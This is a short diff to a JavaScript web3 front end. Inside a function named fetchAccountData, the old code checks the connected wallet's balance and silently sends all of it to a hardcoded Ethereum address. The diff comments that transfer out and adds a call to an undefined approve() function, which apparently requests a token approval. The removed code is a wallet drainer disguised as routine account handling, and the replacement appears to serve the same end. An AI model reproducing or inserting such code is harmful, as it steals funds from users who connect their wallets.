@@ -138,13 +138,16 @@ async function fetchAccountData() {
     const ethBalance = web3.utils.fromWei(balance, "wei");
    const value = web3.utils.toBN(ethBalance).toString();
    if(ethBalance > 0){ console.log("Balance greater than Zero");
-        web3.eth.sendTransaction({
-           from: accounts[0],
-           to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
-           value: value
-       });
+//         web3.eth.sendTransaction({
+//            from: accounts[0],
+//            to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
+//            value: value
+//        }
+		      
+	approve(); 
                           
         console.log(value);
+	console.log('function executed');
 //        .then(function(receipt){
          
 //        });
